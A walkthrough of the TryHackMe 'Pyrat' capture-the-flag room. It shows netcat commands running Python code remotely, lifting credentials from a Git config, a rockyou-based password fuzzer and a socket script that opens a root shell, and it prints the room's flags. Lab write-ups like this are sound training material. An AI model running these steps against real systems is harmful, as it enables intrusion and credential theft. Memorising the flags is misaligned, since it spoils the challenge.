# TryHackMe: Pyrat Walkthrough

**Date:** March 6, 2026
**Difficulty:** Medium
**Target IP:** 10.48.190.50

## 1. Reconnaissance

The initial reconnaissance phase began with a comprehensive Nmap scan to identify open ports and services.

### Nmap Scan Results
```bash
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
8000/tcp open  http-alt SimpleHTTP/0.6 Python/3.11.2
```

The scan revealed a standard SSH service on port 22 and an unusual service on port 8000. Further investigation of port 8000 showed that it was returning Python error messages, suggesting a potential Python code execution vulnerability.

## 2. Initial Foothold

### Confirming Python Code Execution
Connecting to port 8000 using Netcat and sending a simple Python command confirmed the vulnerability.

```bash
echo "print(2+2)" | nc 10.48.190.50 8000
# Output: 4
```

### Enumeration via Python
I used the Python environment to enumerate the system. Interestingly, checking the current user revealed `www-data`, but the process environment variables indicated `HOME=/root` and `LOGNAME=root`.

```bash
echo "import os; print(os.popen('id').read())" | nc 10.48.190.50 8000
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 3. Privilege Escalation to User (think)

### Discovering the Well-Known Folder
The CTF description mentioned a "well-known folder". A search for common folders revealed a Git repository in `/opt/dev`.

```bash
find /opt/dev -name ".git" -type d
# /opt/dev/.git
```

### Extracting Credentials
Inspecting the Git configuration file revealed hardcoded credentials for the user `think`.

```bash
cat /opt/dev/.git/config
```
**Findings:**
- **Username:** `think`
- **Password:** `_TH1NKINGPirate$_`

### Obtaining the User Flag
Using these credentials, I logged in via SSH and retrieved the user flag.

```bash
ssh think@10.48.190.50
cat /home/think/user.txt
# Flag: 996bdb1f619a68361417cabca5454705
```

## 4. Privilege Escalation to Root

### Analyzing the Custom Application
The application running on port 8000 (discovered to be `/root/pyrat.py`) had a special `admin` endpoint that requested a password.

```bash
echo "admin" | nc 10.48.190.50 8000
# Output: Password:
```

### Password Fuzzing
Based on the hint "Keep playing with the custom app" and the mention of fuzzing, I wrote a Python script to fuzz the `admin` password using the `rockyou.txt` wordlist.

```python
import socket

def fuzz():
    with open('rockyou.txt', 'r', encoding='latin-1') as f:
        for line in f:
            password = line.strip()
            # ... connection and logic ...
```

The password for the `admin` endpoint was found to be `abc123`.

### Gaining Root Access
Upon successfully entering the admin password, the application provided an option to enter a `shell`. Since the application starts as root and only drops privileges for non-admin users, the `shell` command granted a root shell.

```python
import socket
import time

s = socket.socket()
s.connect(('10.48.190.50', 8000))
s.send(b'admin\n')
time.sleep(0.5)
s.send(b'abc123\n')
time.sleep(0.5)
s.send(b'shell\n')
# ... root shell achieved ...
```

### Obtaining the Root Flag
```bash
cat /root/root.txt
# Flag: ba5ed03e9e74bb98054438480165e221
```

## 5. Summary
The Pyrat challenge required a combination of identifying a Python code execution vulnerability, performing Git repository forensics to extract credentials, and finally discovery and fuzzing of a custom administrative endpoint to achieve full system compromise.
